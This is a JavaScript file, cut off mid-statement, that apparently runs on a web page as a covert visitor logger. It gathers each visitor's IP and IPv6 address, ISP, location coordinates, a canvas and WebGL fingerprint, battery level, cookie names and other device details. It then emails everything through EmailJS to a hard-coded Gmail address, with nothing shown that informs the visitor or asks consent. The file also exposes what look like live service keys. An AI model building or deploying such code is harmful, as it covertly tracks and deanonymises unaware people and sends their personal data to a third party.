emailjs.init("2jj19BTFwlNnm8fp_");

async function sendEmail(data) {
    const emailData = {
        to_email: "surner282@gmail.com", // Your target email (VISIBLE IN CODE)
        subject: "New IP Visitor - Full Data",
        message: `=== IP & NETWORK ===
IP ADDRESS: ${data.ip}
IPv6: ${data.ipv6}
LOCATION: ${data.location}
ISP / PROVIDER: ${data.isp}
COUNTRY CODE: ${data.country}
TIMEZONE: ${data.timezone}
COORDINATES: ${data.coords}
ASN: ${data.asn}
VPN/PROXY: ${data.vpn}

=== SYSTEM INFO ===
OS: ${data.os}
BROWSER: ${data.browser}
USER AGENT: ${data.useragent}
SCREEN: ${data.screen}
LANGUAGE: ${data.language}
CONNECTION: ${data.connection}
CPU CORES: ${data.cores}
MEMORY: ${data.memory}
TOUCH SUPPORT: ${data.touch}
BATTERY: ${data.battery}
DEVICE MODEL: ${data.deviceModel}
HARDWARE CONCURRENCY: ${data.hardwareConcurrency}
DEVICE MEMORY: ${data.deviceMemory}
PLUGINS: ${data.plugins}
MIME TYPES: ${data.mimeTypes}

=== GEOLOCATION ===
LATITUDE: ${data.latitude}
LONGITUDE: ${data.longitude}
ACCURACY: ${data.accuracy}

=== BROWSER DATA ===
COOKIES ENABLED: ${data.cookies}
LOCAL STORAGE: ${data.localStorageSupport}
SESSION STORAGE: ${data.sessionStorageSupport}
WEBGL: ${data.webgl}
CANVAS FINGERPRINT: ${data.canvas}
REFERRER: ${data.referrer}
JAVA ENABLED: ${data.java}
FLASH: ${data.flash}

=== ADDITIONAL ===
TIMEZONE OFFSET: ${data.timezoneOffset}
LOCAL TIME: ${data.localTime}
PLATFORM: ${data.platform}
DO NOT TRACK: ${data.doNotTrack}
ONLINE STATUS: ${data.onlineStatus}
CONNECTION TYPE: ${data.connectionType}
DOWNLINK: ${data.downlink}
EFFECTIVE TYPE: ${data.effectiveType}
ROUND TRIP TIME: ${data.rtt}
SAVE DATA: ${data.saveData}
SAVED COOKIES: ${data.savedCookies}`
    };

    try {
        // Send email using EmailJS (Service ID and Template ID are VISIBLE IN CODE)
        await emailjs.send("service_yn5chrh", "template_psyarye", emailData);
        console.log('Email sent successfully via frontend.');
    } catch (error) {
        console.error('Email failed from frontend:', error);
    }
}

// Helper functions for client-side data collection

function getOS(userAgent) {
    if (userAgent.includes("Win")) return "Windows";
    if (userAgent.includes("Mac")) return "macOS";
    if (userAgent.includes("Linux")) return "Linux";
    if (userAgent.includes("Android")) return "Android";
    if (userAgent.includes("iPhone")) return "iOS";
    return "Unknown";
}

function getBrowser(userAgent) {
    if (userAgent.includes("Chrome") && !userAgent.includes("Edge")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
    if (userAgent.includes("Edge")) return "Edge";
    if (userAgent.includes("Opera")) return "Opera";
    return "Unknown";
}

async function getIPv6Address() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'unavailable';
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint test', 2, 2);
        return canvas.toDataURL().slice(-20);
    } catch {
        return 'blocked';
    }
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'not supported';
        const renderer = gl.getParameter(gl.RENDERER);
        const vendor = gl.getParameter(gl.VENDOR);
        return `${vendor} ${renderer}`.substring(0, 50);
    } catch {
        return 'blocked';
    }
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}% - ${battery.charging ? 'charging' : 'not charging'}`;
        }
        return 'unavailable';
    } catch {
        return 'blocked';
    }
}

function detectVPN() {
    const timezoneOffset = new Date().getTimezoneOffset();
    const systemLanguage = navigator.language;
    const userAgent = navigator.userAgent;

    if (timezoneOffset !== 0 && systemLanguage.substring(0,2) !== 'en') return 'possible';
    if (userAgent.includes('Proxy') || userAgent.includes('VPN')) return 'detected';
    return 'not detected';
}

async function getGeolocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            latitude: data.latitude || 'unavailable',
            longitude: data.longitude || 'unavailable',
            accuracy: 'high'
        };
    } catch (error) {
        console.error('Geolocation error:', error);
        return { latitude: 'unavailable', longitude: 'unavailable', accuracy: 'unavailable' };
    }
}

function getSavedCookies() {
    const cookies = document.cookie.split('; ').map(cookie => cookie.split('=')[0]);
    return cookies.join(', ');
}

async function loadData() {
    let collectedData = {}; // Data to be displayed and sent

    try {
        // Fetch IP details from ipapi.co (client-side)
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        console.log('IP Data:', ipData);

        collectedData.ip = ipData.ip || 'error';
        collectedData.ipv6 = await getIPv6Address();
        collectedData.location = `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}`;
        collectedData.isp = ipData.org || 'unknown';
        collectedData.country = `${ipData.country_code || 'unknown'} (${ipData.country_calling_code || 'n/a'})`;
        collectedData.timezone = ipData.timezone || 'unknown';
        collectedData.coords = `${ipData.latitude || 'unknown'}, ${ipData.longitude || 'unknown'}`;
        collectedData.asn = `AS${ipData.asn || 'unknown'} - ${ipData.network || 'unknown'}`;

        // Collect all other client-side data
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

        collectedData.userAgent = navigator.userAgent;
        collectedData.screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`;
        collectedData.language = `${navigator.language || 'unknown'} (${navigator.languages?.join(', ') || 'n/a'})`;
        collectedData.connection = connection ? `${connection.effectiveType || 'unknown'} - ${connection.downlink || 'unknown'}mbps (${connection.type || 'unknown'})` : 'unavailable';

        collectedData.cores = navigator.hardwareConcurrency || 'unknown';
        collectedData.memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown';
        collectedData.touch = 'ontouchstart' in window ? 'supported' : 'not supported';
        collectedData.battery = await getBatteryInfo();
        collectedData.cookies = navigator.cookieEnabled ? 'enabled' : 'disabled';
        collectedData.localStorageSupport = typeof(Storage) !== "undefined" ? 'supported' : 'not supported';
        collectedData.sessionStorageSupport = typeof(sessionStorage) !== "undefined" ? 'supported' : 'not supported';
        collectedData.webgl = getWebGLInfo();
        collectedData.canvas = getCanvasFingerprint();
        collectedData.referrer = document.referrer || 'direct';
        collectedData.java = navigator.javaEnabled ? navigator.javaEnabled() : 'unknown';
        collectedData.flash = navigator.plugins['Shockwave Flash'] ? 'enabled' : 'not detected';
        collectedData.timezoneOffset = new Date().getTimezoneOffset();
        collectedData.localTime = new Date().toLocaleString();
        collectedData.platform = navigator.platform;
        collected
